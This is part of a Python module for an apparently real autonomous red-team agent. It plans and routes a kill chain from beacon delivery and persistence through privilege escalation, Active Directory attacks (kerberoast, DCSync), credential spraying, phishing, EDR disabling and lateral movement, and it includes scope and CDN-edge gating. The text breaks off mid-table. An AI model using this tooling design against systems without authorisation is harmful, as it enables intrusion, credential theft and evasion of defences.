"""
agent.py — the autonomous red-team agent.

run_autonomous() ties the whole stack together:

    target -> WorldModel -> Planner -> Orchestrator(pool) -> StealthRuntime
            -> capabilities (command knowledge model) -> perception
            -> findings back into WorldModel -> repeat until goal or
            "nothing new can make the next move work".

Termination rule: a failed capability stays dead unless NEW facts appear
that are useful for its preconditions (e.g. creds found after ssh_login
failed). No budgets, no infinite retries: stealth reasoning keeps the
agent quiet (one login try, not 200).

Every decision is streamed through on_event (for the live console), and
pause/stop keys are honored when interactive=True.
"""

from __future__ import annotations

import os
import random
import re
import threading
import time
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple

from phantom.automation.belief import WorldModel, Finding
from phantom.automation.guidance.commands import Registry, make_registry
from phantom.automation.guidance.dynamics import DynCommandBuilder
from phantom.automation.guidance.stealth import StealthEngine, StealthConfig
from phantom.automation.guidance.threatmodel import BlueTeamModel
from phantom.automation.planner import Planner, Plan, PlanStep
from phantom.automation.reasoning import ReasoningEngine
from phantom.automation.enterprise import EnterpriseBrain
from phantom.automation.orchestrator import Orchestrator, PrioritizedAction, ActionStatus
from phantom.automation.runtime.stealth_runtime import StealthRuntime
from phantom.automation.runtime.toolchain import ToolRegistry
from phantom.automation.sandbox.sandbox import SandboxEngine, SandboxVerdict
from phantom.automation.social.engine import SocialEngine
from phantom.automation.fallback import FallbackEngine, HistoricalLearner
from phantom.automation.ad_awareness import ADAwareness
from phantom.core.executor import execute_quiet
from phantom.core.safe_exec import unsafe_slot_reason

# Re-exported leaf helpers / value objects — see agent_support.py. Kept in
# the agent namespace so the existing import surface (tests, campaign code)
# does not change.
from phantom.automation.agent_support import (
    ShareContext,
    EventSink,
    _BeaconSession,
    _in_scope,
    _safe_stream_value,
    _is_ip,
    _headers_from_raw,
    _best_origin,
)


def _audit_decision(kind: str, **fields: Any) -> None:
    """Best-effort decision telemetry (never takes the planner down)."""
    try:
        from phantom.automation import decision_audit as _audit
        _audit.record(kind, **fields)
    except Exception:
        pass


def _health_enabled() -> bool:
    try:
        from phantom.utils import config as cfg
        return cfg.get_bool("automation.capability_health", True,
                            env="PHANTOM_CAPABILITY_HEALTH")
    except Exception:
        return True


def _record_health(cap_id: str, ok: bool, reason: str = "") -> None:
    """Best-effort per-capability health ledger update (never fatal)."""
    if not _health_enabled():
        return
    try:
        from phantom.automation import capability_health as _ch
        _ch.instance().record(cap_id, ok, reason)
    except Exception:
        pass

# Bump when a checkpoint field changes MEANING (not when one is added):
# from_state reads every field defensively, so a mismatch is a warning to
# the operator, never a hard failure.
CHECKPOINT_SCHEMA = 1

# Deep mode: the goal string that runs the full engagement ladder back-to-
# back in ONE run instead of stopping at the first terminal goal. Each stage
# is a normal planner goal; a stage ends when its own goal facts exist (or
# no further move is viable — the planner halts fast on impossible stages,
# e.g. lateral with no peer host in scope), and the NEXT stage takes over:
#   deliver      -> beacon + persistence (the classic terminal)
#   post_exploit -> SYSTEM/root escalation + process injection (beacon ch.)
#   ad           -> domain enumeration + kerberoast/AS-REP/DCSync (dual ch.)
#   crack        -> crack the harvested hashes offline
#   lateral      -> pivot to in-scope peer hosts when any exist
DEEP_GOAL = "deep"
# the deep ladder: beacon+persistence -> privesc -> INTERNAL expansion
# (recon + pivot-service probing, which also feeds the lateral hosts) ->
# AD -> crack -> lateral movement. "evasion" is NOT in the static tuple:
# it is inserted at run time only for aggressive runs (edr_disable is
# aggressive-only), so a stealth/deep run never touches the defensive stack.
DEEP_STAGES = ("deliver", "post_exploit", "expand", "ad", "crack", "lateral")


# Gap class -> the capabilities that serve it. The fallback engine's gap
# analysis says which STRATEGY class is still worth trying; this maps that
# back to the concrete moves, so a stall recovery can re-arm the useful ones
# first instead of iterating a dict in insertion order.
# Gap class -> the capability families worth re-arming, best first. Two
# entries named capabilities that DO NOT EXIST ("smb_login"/"cred_dump"
# for credential acquisition, "phish"/"dm_stage1" for the identity
# delivery path): the mapping silently degraded to an arbitrary re-arm
# order for those gaps, which looks identical to a working priority. The
# suite now pins every id here against the real registry, because a name
# that matches nothing is worse than no hint at all.
_GAP_CAP_HINTS = {
    "network_beacon": ("beacon_deploy", "lateral_pivot", "smb_pivot",
                       "winrm_pivot"),
    "network_creds": ("ssh_login", "web_creds", "cred_spray",
                      "breach_check"),
    "exploit_chain": ("service_exploit", "web_rce", "http_probe"),
    "network_footprint": ("scan_tcp", "version_detect", "surface_map"),
    "identity_breach": ("breach_correlate", "breach_check", "osint_identity"),
    "identity_field": ("email_candidates", "email_verify", "breach_correlate"),
    "identity_phish": ("phish_identity", "campaign_launch", "dm_launch",
                       "poll_hits"),
    "identity_beacon": ("phish_identity", "dm_stage2", "poll_hits",
                        "harvest_campaign"),
    "identity_osint": ("osint_identity", "profile_recon"),
}

# Slot values interpolated RAW into a command string, restricted to the
# ones that come from the TARGET (findings, banners, credential discovery,
# resolved hosts). Those are the injection surface, so they are validated
# before execution (see `_execute_capability`).
#
# Deliberately excluded: operator-supplied LOCAL paths and labels —
# `carrier`/`payload`/`staging`/`dir`/`bundle` (file paths the executor
# rewrites for WSL, e.g. C:\... -> /mnt/c/...) and scalars picked from a
# fixed list (`os`, `method`, `platform`, `provider`, `dialect`). Those are
# not attacker-controlled and blocking them would only break real runs.
_SHELL_SLOT_NAMES = frozenset((
    "base_url", "callback", "domain", "host", "lhost", "lport",
    "password", "port", "ports", "role_arn", "target", "url", "username",
))


# ── the EDGE gate's vocabulary ─────────────────────────────────────────────
#
# Packet-level work, refused while the address in scope is a provider's
# reverse proxy. The list is explicit rather than "everything that is not
# web": a capability added later must be classified on purpose.
_EDGE_GUARDED_CATEGORIES = ("scan", "service", "brute", "exploit", "hunt")
_EDGE_GUARDED_IDS = ("scan_tcp", "version_detect", "os_detect",
                     "fingerprint_services", "mobile_probe")
_EDGE_EXEMPT_IDS = ("origin_discovery", "surface_map")


# ---------------------------------------------------------------------------
# agent
# ---------------------------------------------------------------------------

class AutonomousAgent:
    """Runs a goal-directed kill chain against one target."""

    def __init__(self, target: str, target_type: str = "auto",
                 profile: str = "enterprise", aggressive: bool = False,
                 stealth: bool = True,
                 paranoid: bool = False,
                 speed: bool = False,
                 on_event: Optional[Callable[[str, dict]]] = None,
                 registry: Optional[Registry] = None,
                 runtime: Optional[StealthRuntime] = None,
                 sandbox: Optional[SandboxEngine] = None,
                 cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                 scope_list: Optional[List[str]] = None,
                 toolchain: Optional[ToolRegistry] = None,
                 share: Optional[ShareContext] = None,
                 beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                 social_engine: Optional[Any] = None,
                 trojan_assets: Optional[Dict[str, str]] = None,
                 command_seed: int = 0,
                 shared_wm: Optional["WorldModel"] = None,
                 hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                 hunt_delay: Optional[float] = None,
                 fuzz_sender: Optional[Callable[[str, str], Any]] = None,
                 edge_runner: Optional[Callable[..., Any]] = None,
                 threat_intel=None,
                 persist_learning: bool = False,
                 experience: bool = False,
                 evolution: bool = False,
                 llm: bool = False,
                 stop_event=None,
                 reason_profile: str = "",
                 cell_loop: bool = False,
                 cell_stages: Optional[List[str]] = None,
                 evolution_mode: str = "code",
                 identity_active: bool = False,
                 resilient_stager: bool = True) -> None:
        self.target = target
        if target_type in ("", "auto"):
            from phantom.automation.guidance.targets import classify_target
            target_type = classify_target(target)
        self.target_type = target_type
        self.profile = profile
        self.aggressive = aggressive
        self.stealth = stealth
        self.paranoid = paranoid
        self.speed = speed
        # I2: the DEDICATED identity-active consent (separate from
        # --aggressive). It is stamped on the WorldModel so the identity
        # reasoning ladder and the active probes (reset-enum / SMTP verify)
        # can read ONE source of truth. Contact stays a separate, explicit
        # choice (never implied by active).
        self.identity_active = bool(identity_active)
        self.reason_profile = reason_profile
        # resilient stager is INDEPENDENT of paranoid: a delivery that only
        # works when the C2 happens to be up is a one-shot gamble. Opting out
        # is explicit (`--no-resilient`), never a side effect of max-OPSEC.
        self.resilient_stager = resilient_stager
        self.scope_list = scope_list or []
        # target ledger: the single source of truth for the ACTIVE target
        # set (initial + mid-run pivots), their classification, and the
        # scope/provenance authorization of every discovered pivot.
        # The doctrine gate reads `ledger.chain_class()` so a username
        # never opens with a port scan and an IP never gets a breach lookup.
        from phantom.automation.brain.targets import TargetLedger
        self.ledger = TargetLedger(target, scope_list=list(self.scope_list))

        self.wm = (shared_wm if shared_wm is not None
                   else WorldModel(target=target, target_type=target_type))
        # I2: stamp the dedicated identity consent on the WorldModel AFTER it
        # exists, so the reasoning ladder and the active probes read ONE
        # source of truth. Contact stays a separate, explicit choice.
        self.wm.identity_consent = {"active": self.identity_active,
                                    "contact": False}
        # port-scan coverage per run profile: default and stealth sweep the
        # full range up front (non-standard services like SSH-on-2222 are
        # visible immediately); speed and aggressive keep the fast top-ports
        # (deep scan is still escalated by _recover_stall if no access
        # service appears). Read by the scan adapters in guidance/kit.py.
        if aggressive:
            self.wm.scan_style = "top_loud"      # fast + noisy, top ports
        elif speed:
            self.wm.scan_style = "top_fast"      # fast, top ports
        elif paranoid:
            self.wm.scan_style = "full_stealth"  # full range, slow timing
        else:
            self.wm.scan_style = "balanced"      # top-1000, standard rate
        self.blue_team = BlueTeamModel.for_profile(profile)
        config = StealthConfig(aggressive=aggressive, paranoid=paranoid,
                               speed=speed, profile=profile)
        self.stealth_engine = StealthEngine(self.wm, config, self.blue_team)
        self.registry = registry or make_registry()
        # evidence_first buys INFORMATION, not quiet: the planner ranks
        # ready moves by unlocked facts (value_weight=1.0). Every other
        # profile keeps the historical cost-first ordering (0.0).
        self.planner = Planner(
            self.registry, self.stealth_engine,
            value_weight=1.0 if reason_profile == "evidence_first" else 0.0)
        self.reasoning = ReasoningEngine(self.registry, paranoid=paranoid)
        self.enterprise = EnterpriseBrain(profile, threat_intel=threat_intel)
        # R1/R2/R3 reasoning core: a named objective (the profile) plus the
        # arbiter that reads a move through five lenses whose weights follow
        # the ENGAGEMENT STATE (events, never a clock). `base` remains the
        # legacy expected value, so the arbitration is a bounded modulation:
        # it reorders near-ties and never silently inverts the kill-chain
        # ordering or makes a forbidden move affordable.
        from phantom.automation.brain.lenses import Arbitrator, choose_profile
        self.reasoning_profile = choose_profile(
            profile, paranoid=paranoid, aggressive=aggressive, speed=speed,
            explicit=reason_profile)
        self.arbiter = Arbitrator(self.reasoning_profile)
        self._decisions: Dict[str, Any] = {}
        # DECISION TRACE (7.5): `_decisions` keeps only the last verdict per
        # capability and dies with the process. The trace keeps the ORDERED
        # history — which lens made each call, in which stage — survives a
        # checkpoint, and is what the report and `--verbose` show, so the
        # arbiter's choices are auditable instead of merely plausible.
        from phantom.automation.brain.trace import DecisionTrace
        self.trace = DecisionTrace()
        self._last_stall: str = ""
        self._current_stage: str = ""
        # B3/I4 introspection: the plan-variant arbitration and the identity
        # field DAG of the last planning pass (report material).
        self._plan_choice: Optional[dict] = None
        self._identity_field_model: Optional[dict] = None
        self._last_failed_cap: Any = None
        # C2/C4: the run's cell team (roster + egress permit + bus +
        # tribunal). The roster IS the authority now: C4 is complete, so
        # `cell_loop` is on by default and there is no second planning path
        # to fall back to. The flag is kept only so an older caller that
        # passes False still gets the roster (it cannot switch it off).
        self.cell_loop = bool(cell_loop or True)
        self.cell_stages: tuple = tuple(cell_stages or ())
        self.cells: Any = None
        # set when the roster could not be built: `_drive_stage` halts
        # instead of silently reverting to the removed planning path
        self._cells_failed: bool = False
        self.persist_learning = persist_learning
        # self-improvement loop flag: when True, stable uncovered failure
        # patterns are closed by an authoring sub-agent (background, never
        # blocking) that opens a reviewable PR. Off by default.
        self.evolution = evolution
        # C3: how a learning gap is closed — `code` (author + gate + lab) or
        # `proposal` (`--oM`: a reviewed markdown dossier, no LLM, no lab).
        self.evolution_mode = str(evolution_mode or "code")
        self._evolution_spawned = False
        # case-based EXPERIENCE memory (brain/experience): remembers the
        # situation, the technique's OUTCOME, WHY it failed and which move
        # unblocked it, so a wall hit earlier is not hit the same way again.
        # Like the priors it only REORDERS moves that already passed every
        # gate — it can never authorise anything.
        # `experience=True` means the memory PERSISTS across engagements
        # (data/experience_cases.json, local disk only); False keeps it
        # engagement-scoped (run-only, nothing on disk). The entry points
        # resolve the operator's intent via automation.experience
        # (default true) / --no-experience and pass the resolved value here.
        self.experience = _make_experience(experience)
        self.planner.experience = self.experience
        self.runtime = runtime or StealthRuntime(self.stealth_engine)
        self.sandbox = sandbox if sandbox is not None else SandboxEngine()
        self.toolchain = toolchain if toolchain is not None else ToolRegistry()
        self.share = share if share is not None else ShareContext(peers=[])
        self._cred_discoverer = cred_discoverer or self._default_cred_discovery
        self._failed_caps: Dict[str, float] = {}  # capability -> failure ts
        # novelty set (swarm): capability ids a SIBLING worker already
        # tried. Unlike failures these never re-arm via _retry_eligible —
        # the whole point is forcing this worker down a different path
        # for the entire run. Consulted by _dead_cap_ids.
        self._novelty_dead: set = set()
        self._last_fail_reason: Dict[str, str] = {}  # capability -> last failure reason
        # consecutive-identical-failure poisoning: a move that fails the same
        # way three times is a deterministic dead end for THIS target. It is
        # dropped from planning and recovery so the agent falls through to
        # the next beacon source (e.g. web_creds -> web_rce) instead of
        # spinning forever.
        self._fail_notes: Dict[tuple, int] = {}
        self._poisoned: set = set()
        # Explicit `unblock` condition per failed capability: what NEW facts
        # would make this move viable again, in plain words. This is the
        # auditable answer to "why is this dead, and what revives it" — the
        # operator no longer has to infer it from the failure reason.
        self._unblock_conditions: Dict[str, str] = {}
        self._recoveries = 0
        self._max_recoveries = 3
        self._session: Optional["_BeaconSession"] = None
        self._beacon_builder = beacon_builder or self._default_beacon_builder
        self.social_engine = social_engine if social_engine is not None else SocialEngine()
        self._trojan_assets = trojan_assets or {}
        self._fallback: Any = None
        self._history: Any = None
        self._ad_checked: bool = False

        # v3.0: load historical self-learning if persist_learning is on
        if persist_learning:
            from phantom.automation.fallback import init_historical_learner
            self._history = init_historical_learner()
            self._fallback = FallbackEngine(history=self._history)
            # cross-session technique priors (brain/priors.py): earned
            # success rates reorder equally-ready moves in the planner.
            from phantom.automation.brain.priors import TechniquePriors
            self._priors = TechniquePriors()
            self.planner.priors = self._priors
        else:
            self._fallback = FallbackEngine()
            self._priors = None
        self._dyn = DynCommandBuilder(seed=command_seed)
        self.hunt_runner = hunt_runner
        self.hunt_delay = hunt_delay
        # optional in-process fuzz sender (tests / campaigns inject a
        # scripted sender); None means the bounded urllib sender is used
        self.fuzz_sender = fuzz_sender
        # origin-discovery transport: `runner(cmd, timeout=…)` with
        # `.ok`/`.stdout`, injectable exactly like hunt_runner/fuzz_sender so
        # the EDGE gate can be exercised offline with no DNS and no network.
        self.edge_runner = edge_runner
        self.sink = EventSink()
        self._on_event = on_event
        # optional local-LLM advisor: non-gating, injection-hardened
        from phantom.automation.llm_advisor import LLMAdvisor
        self.llm_advisor = LLMAdvisor(enabled=llm, paranoid=paranoid)
        # only when the operator actually enabled the advisor: let it name
        # the failure cause for the ambiguous tail (rules always run first,
        # so the deterministic path is never dependent on a model).
        if getattr(self.llm_advisor, "enabled", False):
            try:
                self.experience.set_classifier(
                    self.llm_advisor.classify_failure)
            except Exception:
                pass
        self.goal: Optional[str] = None
        self.result: Dict[str, Any] = {}
        self._stage_outcomes: Dict[str, bool] = {}
        # campaign cooperation: peers' findings are absorbed ONCE per run
        self._absorbed_shared: bool = False
        # cooperative stop flag (set by the orchestrator / frontends); a
        # missing attribute means "never stop" so bare constructions in
        # tests need no setup
        self._stop_event = stop_event

    # ------------------------------------------------------------- plumbing

    def _scope_ok(self) -> bool:
        """Scope discipline. Identity targets (email/username/phone) are the
        engagement SUBJECT and are always in scope: the scope list gates the
        MACHINES (ip/domain/url) and the harvested victim_ip — which is the
        same person's asset by design, so the identity chain can converge on
        it.

        A-6: an empty scope list is NOT a blank cheque. Auto-mode refuses to
        run unscoped unless the operator explicitly opted out with
        ``engagement.allow_unscoped`` / ``PHANTOM_ALLOW_UNSCOPED=1`` — the same
        switch the desktop API honours — so the two planes cannot disagree
        about what "no scope" means."""
        from phantom.automation.guidance.targets import is_identity_target
        if is_identity_target(self.target_type):
            return True
        if not self.scope_list:
            from phantom.core.scope import unscoped_allowed
            return unscoped_allowed()
        return _in_scope(self.target, self.scope_list)

    def _stop_requested(self) -> bool:
        """True when the operator (or another frontend) requested a stop.
        Cooperative: checked between planner iterations and inside the
        phase-wait poll, so a long scan already in flight finishes and the
        loop exits at the next boundary instead of mid-action."""
        ev = getattr(self, "_stop_event", None)
        return ev is not None and ev.is_set()

    def _absorb_shared(self) -> None:
        """Import high-value findings peers discovered into this WorldModel.

        Runs at the top of every planning pass. Shared kinds are imported
        only when THIS agent has no equal-or-better fact of its own (a
        peer's victim_ip never overrides a locally validated one), with
        source="peer" so the report can attribute campaign cooperation.
        """
        if not self.share or self._absorbed_shared:
            return
        for kind in ShareContext.SHARED_KINDS:
            entry = self.share.shared_finding(kind)
            if entry is None:
                continue
            value, src_target = entry
            if src_target == self.target:
                continue
            own = self.wm.find(kind)
            if own and kind == "victim_ip":
                # a locally validated identity outranks a peer's
                continue
            key = f"peer:{src_target}:{kind}"
            try:
                if self.wm.get(kind, key) is None:
                    self.wm.add_finding(kind, key, value,
                                        confidence=0.8, source="peer")
                    self._emit("shared", kind=kind, from_target=src_target)
            except Exception:
                continue

    def _emit(self, kind: str, **data) -> None:
        # a blocked/failed event carries the explicit unblock condition when
        # one is known, so the decision stream answers "what would revive
        # this move" instead of leaving the operator to guess
        cap_id = data.get("capability")
        if cap_id and kind in ("blocked", "failed"):
            cond = self._unblock_conditions.get(cap_id)
            if cond:
                data.setdefault("unblock", cond)
        self.sink.emit(kind, **data)
        if self._on_event:
            try:
                self._on_event(kind, data)
            except Exception:
                pass

    def _emit_found(self, capability: str, findings=None, *, labels=None,
                    partial: bool = False) -> None:
        """Emit a `found` event that ALWAYS carries an operator-visible value.

        The renderers can only print `key = value` when the event carries
        the value map. Three call sites used to inline their own summary
        (dropping the cookie-jar guard) and four passed no values at all,
        so the stream showed bare keys like `banner:tcp/22:`. One helper
        so every site cannot drift apart on this again.
        """
        findings = list(findings or [])
        if labels is None:
            labels = [f"{f.kind}:{f.key}" for f in findings]
        else:
            labels = list(labels)
        values = {f"{f.kind}:{f.key}": _safe_stream_value(f) for f in findings}
        self._emit("found", capability=capability, findings=labels,
                   values=values, partial=partial)

    # ------------------------------------------------- noise accounting

    def _account_noise(self, cap) -> None:
        """Feed the noise circuit breaker before a loud move executes.
        Categories map to breaker events; the WorldModel persists the score
        so resumed runs remember how loud the engagement already was."""
        try:
            if cap.category == "brute":
                self.wm.record_noise("brute_online")
            elif cap.category == "scan" and cap.stealth_level == "aggressive":
                self.wm.record_noise("loud_scan")
            elif cap.category == "ad":
                self.wm.record_noise("ad_attack")
            elif cap.category in ("exploit", "hunt"):
                self.wm.record_noise("exploit")
        except Exception:
            pass

    # ── origin discovery (EDGE gate) ───────────────────────────────────────

    def _origin_run(self, cmd: str, timeout: int = 15) -> str:
        """One bounded discovery command; stdout only, never raises."""
        runner = self.edge_runner
        if runner is not None:
            try:
                res = runner(cmd, timeout=timeout)
                return str(getattr(res, "stdout", "") or "")
            except Exception:
                return ""
        try:
            from phantom.core.executor import execute_quiet
            res = execute_quiet(cmd, timeout=timeout + 10)
            return str(getattr(res, "stdout", "") or "")
        except Exception:
            return ""

    def _edge_resolve(self, host: str) -> Tuple[str, List[str]]:
        """(cname, [ips]) for a host through CNAME + A lookups.

        With `edge_runner` injected this is a pure function of scripted
        answers, which is how the whole gate is tested offline.
        """
        cname = ""
        out = self._origin_run(f"dig +short CNAME {host}", timeout=10).strip()
        if out:
            cname = out.splitlines()[0].strip().strip(".")
        ips = [ln.strip() for ln in
               self._origin_run(f"dig +short A {host}", timeout=10).splitlines()
               if _is_ip(ln.strip())]
        return cname, ips

    def _edge_headers(self, addresses: Sequence[str]) -> Dict[str, str]:
        """Response headers of the address in scope (best effort).

        An ordinary HTTP request, not a probe: it is how any client learns
        that the site in front of the target is Cloudflare.
        """
        for addr in addresses:
            if not addr or addr == "-":
                continue
            for scheme in ("http", "https"):
                raw = self._origin_run(
                    f"curl -sS -k -I -m 10 {scheme}://{addr}", 12)
                if raw:
                    return _headers_from_raw(raw)
        return {}

    def _edge_verdict(self) -> Optional[dict]:
        """The EDGE finding that applies to the address this run aims at."""
        from phantom.automation.brain.edge import EDGE_FACT, EDGE_THRESHOLD
        try:
            findings = self.wm.find(EDGE_FACT)
        except Exception:
            return None
        target = str(self.target)
        for f in findings:
            v = f.value if isinstance(f.value, dict) else {}
            if not v.get("is_edge"):
                continue
            try:
                if float(v.get("confidence", 0) or 0) < EDGE_THRESHOLD:
                    continue
            except (TypeError, ValueError):
                continue
            addr = str(v.get("address", "") or "")
            if addr and addr != target:
                continue
            return v
        return None

    def _edge_guard(self, cap) -> str:
        """Refuse a target-touching move while the address in scope is a
        provider's edge. Returns the refusal reason, or "".

        What is gated and what is not is a deliberate line:

          * GATED — packet-level work (port scan, version/OS detection,
            per-service enumeration, brute force, exploit and anomaly
            hunting): it would footprint the provider and touch a third
            party's infrastructure;
          * NOT gated — ordinary web requests (http_probe/http_get) and the
            discovery pass itself. Those are what a normal visitor does, and
            they are how the provider is identified in the first place.

        The refusal is a DEFERRAL, not a failure: the capability stays
        plannable and unlocks the moment an origin is discovered, because
        `_effective_target` then aims it at the origin.
        """
        if (cap.category not in _EDGE_GUARDED_CATEGORIES
                and cap.id not in _EDGE_GUARDED_IDS):
            return ""
        if cap.id in _EDGE_EXEMPT_IDS:
            return ""
        verdict = self._edge_verdict()
        if not verdict:
            return ""
        if _best_origin(self.wm):
            return ""
        self._origin_needed = True
        provider = verdict.get("provider") or "CDN"
        return (f"{provider} edge detected on {self.target}: this is the "
                f"provider's reverse proxy, not the target — discover the "
                f"origin before touching it")

    def _origin_hosts(self) -> List[str]:
        """Candidate hostnames the run already knows about.

        CT-log hosts and surface assets come from the public surface map;
        the target itself is included so a domain target always has a seed.
        """
        hosts: List[str] = []
        for f in self.wm.find("environment"):
            v = f.value if isinstance(f.value, dict) else {}
            for key in ("asset", "value", "domain", "hostname"):
                value = str(v.get(key, "") or "")
                if value:
                    hosts.append(value)
                    break
        for f in self.wm.find("hostname"):
            v = f.value if isinstance(f.value, dict) else {}
            value = str(v.get("hostname", "") or "")
            if value:
                hosts.append(value)
        hosts.append(str(self.target))
        return hosts

    def _run_origin_discovery(self) -> bool:
        """One bounded discovery pass, in-process.

        It NEVER scans the edge: it reads the header evidence, mines CT-log
        hostnames from the public surface map and resolves each candidate,
        then ranks what is provably outside the provider's ranges.
        """
        from phantom.automation.brain import edge as edge_mod
        target = str(self.target)
        addresses = [target]
        victim = self.wm.find("victim_ip")
        if victim:
            v = victim[0].value if isinstance(victim[0].value, dict) else {}
            if v.get("ip"):
                addresses.insert(0, str(v["ip"]))

        hostname = target
        f = self.wm.find("hostname")
        if f:
            v = f.value if isinstance(f.value, dict) else {}
            if v.get("hostname"):
                hostname = str(v["hostname"])

        headers = self._edge_headers(addresses)
        cname, ips = ("", []) if _is_ip(target) else self._edge_resolve(target)
        verdict = edge_mod.detect(address=target, ip=ips[0] if ips else "",
                                  cname=cname, headers=headers)

        hosts: List[str] = list(self._origin_hosts())
        if _is_ip(target):
            # an IP target has no namespace to mine: a PTR plus whatever the
            # surface map already harvested is all there is
            ptr = self._origin_run(f"dig +short -x {target}", timeout=10).strip()
            if ptr:
                hosts.append(ptr.splitlines()[0].strip().strip("."))
            domain = ""
        else:
            domain = hostname
            # CT-log hostnames are the richest origin lead, and they are a
            # PUBLIC-data fetch (crt.sh). An injected edge_runner REPLACES
            # the transport, so the public fetch only happens on the real
            # path — tests and campaigns script it through ct_logs_fn.
            ct = getattr(self, "ct_logs_fn", None)
            if ct is None and self.edge_runner is None:
                try:
                    from phantom.automation.surface import _ct_logs as ct
                except Exception:
                    ct = None
            if ct is not None:
                try:
                    hosts.extend(a.value for a in ct(domain)
                                 if getattr(a, "kind", "") == "ct_host")
                except Exception:
                    pass

        report = edge_mod.discover(target, hosts=hosts, domain=domain,
                                   ip=ips[0] if ips else "", cname=cname,
                                   headers=headers, resolve=self._edge_resolve)
        # a provider can also be identified from the header evidence alone,
        # so the gate can arm even when the resolution was inconclusive
        if not report.verdict.is_edge and verdict.is_edge:
            report.verdict = verdict

        self._emit("run", capability="origin_discovery",
                   banner="origin discovery", category="recon", cost=0.2,
                   command="edge://origin-discovery (in-process)",
                   reason="EDGE: the address in scope is a reverse proxy")
        output = "\n".join(report.markers())
        self._emit("edge", address=target,
                   provider=report.verdict.provider,
                   confidence=round(report.verdict.confidence, 2),
                   is_edge=report.verdict.is_edge,
                   candidates=[c.to_dict() for c in report.candidates[:5]])
        cap = self.registry.get("origin_discovery")
        if cap is None or not output:
            self.wm.record_failure("origin_discovery", "no information")
            return False
        findings = cap.interpret(output, self.wm, {})
        learned = self._register_findings(cap.id, findings)
        self.wm.record_action(cap.id, {}, "edge://origin-discovery",
                              ok=bool(learned),
                              note=f"edge={report.verdict.is_edge} "
                                   f"candidates={len(report.candidates)}")
        if not learned:
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        self._emit_found(cap.id, findings)
        # the gate unlocks only on a REAL origin; when nothing credible came
        # out, say so plainly instead of letting the run retry forever
        best = report.best()
        if report.verdict.is_edge and (best is None or best.confidence < 0.55):
            self._emit("note", capability="origin_discovery",
                       detail=("edge confirmed but no credible origin found: "
                               "supply one via the operator target, or "
                               "expect the provider to block direct access"))
        return True

    def _execute_origin_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """The `origin_discovery` capability when the planner asks for it:
        the same pass, reported as the capability's own run."""
        return self._run_origin_discovery()

    def _maybe_origin_discovery(self) -> None:
        """One-shot scheduling: the gate fired, or an edge is already known
        and the origin is still missing. Bounded to one pass per run so a
        target with no discoverable origin cannot become a discovery loop.
        """
        if getattr(self, "_edge_resolved", False):
            return
        needs = bool(getattr(self, "_origin_needed", False))
        if not needs:
            needs = (self._edge_verdict() is not None
                     and not _best_origin(self.wm))
        if not needs:
            return
        self._edge_resolved = True
        self._run_origin_discovery()

    def _stamp_tool_choice(self, cap) -> None:
        """Record the TARGET-AWARE tool choice for this capability.

        Sets ``wm.chosen_tool`` so the ``kit._chosen_tool`` adapters route
        on it: the emitted command then fits the target's real surface
        rather than the hard-coded default. A target with no SMB surface
        yields ``tool=None`` for ``smb_enum`` (the adapter keeps its
        default) but the choice and its reason are RECORDED, so aiming a
        tool at an absent surface is auditable instead of silent. Never
        fatal: a belt failure leaves the adapter on its default.
        """
        from phantom.automation.brain.toolbelt import Toolbelt
        belt = getattr(self, "_toolbelt", None)
        if belt is None:
            belt = Toolbelt(getattr(self, "toolchain", None))
            self._toolbelt = belt
        surface = belt.surface_from_wm(self.wm)
        choice = belt.pick(cap.id,
                           style=getattr(self.wm, "scan_style", "balanced"),
                           target=surface)
        self.wm.chosen_tool = {"capability": cap.id, "tool": choice.tool,
                               "reason": choice.reason}

    def _authorize_driver(self, cap, slots):
        """Execution-broker gate for a runtime-DISCOVERED driver.

        Re-checks the trust registry, the approval policy, scope, tool
        availability and required inputs through the single choke point
        (AutoModeBrief §13.5) and returns the AUTHORITATIVE command the broker
        built. Failure of the gate itself is fail-CLOSED: an un-vetted driver
        must not run because the checker broke.
        """
        try:
            from phantom.automation.runtime.broker import (
                BrokerDecision, ExecutionBroker)
            from phantom.automation.runtime.capability_registry import (
                CapabilityRegistry)
            reg = getattr(self, "_cap_registry", None)
            if reg is None:
                reg = CapabilityRegistry()
                reg.load()
                self._cap_registry = reg
            broker = getattr(self, "_broker", None)
            if broker is None:
                broker = ExecutionBroker(
                    registry=reg, toolchain=self.toolchain,
                    scope_list=list(self.scope_list or []), lab=False,
                    cancel=getattr(self, "_cancel", None))
                self._broker = broker
            return broker.preflight(cap.driver, target=self.target, slots=slots)
        except Exception as exc:  # noqa: BLE001 — fail closed
            from types import SimpleNamespace
            return SimpleNamespace(allowed=False,
                                   reasons=[f"broker unavailable: {exc}"],
                                   command="")

    # --- channel registry (per kill-chain phase) -------------------------
    # _execute_capability used to be a monolithic dispatcher: shared gates,
    # an if-chain over category/id, and the whole shell-command path in one
    # 350-line method. The routing is now THIS ordered table (registry, not
    # if-chain): (phase, matcher, handler). First match wins, so row order
    # is part of the contract — e.g. an in-process ENGINE in the osint/
    # social lane must resolve before the social channel (phone_osint is an
    # offline lookup, not a side-effecting social move), and the generic
    # engine lane comes after the id-specific engines.
    #
    # `phase` is the owning kill-chain phase (phantom.automation.phases);
    # "any" marks a cross-phase channel, "learned" the machine-authored
    # lane (capabilities with no phase of their own). Handler names are
    # resolved on the agent at dispatch time.
    _CHANNEL_ROUTES: Tuple[Tuple[str, Callable[[Any], bool], str], ...] = (
        # post-exploitation capabilities execute through the beacon channel
        ("post",     lambda cap: cap.category == "post",
         "_execute_post_capability"),
        # AD capabilities are DUAL-channel: through the beacon session when
        # one exists, DIRECTLY from the operator box when it does not — a
        # domain controller can be enumerated/kerberoasted with just
        # network access + credentials, no beacon foothold required.
        ("post",     lambda cap: cap.category == "ad",
         "_execute_ad_capability"),
        # in-process ENGINE capabilities in the identity lane (phone_osint:
        # offline metadata lookup) run through the ENGINE channel, exactly
        # like the recon engines — the social channel owns SIDE EFFECTS
        # (sherlock, breach APIs, phish delivery), not an offline net-less
        # lookup, so a social-category engine must not be routed to it.
        ("osint",    lambda cap: cap.category in ("osint", "social")
                                and getattr(cap, "exec_class", "") == "in_process_engine"
                                and getattr(cap, "engine", None) is not None,
         "_execute_engine_capability"),
        # social/osint capabilities execute through the SocialEngine channel
        # (OSINT discovery, breach lookup, persona, phish, IP-grabber polling)
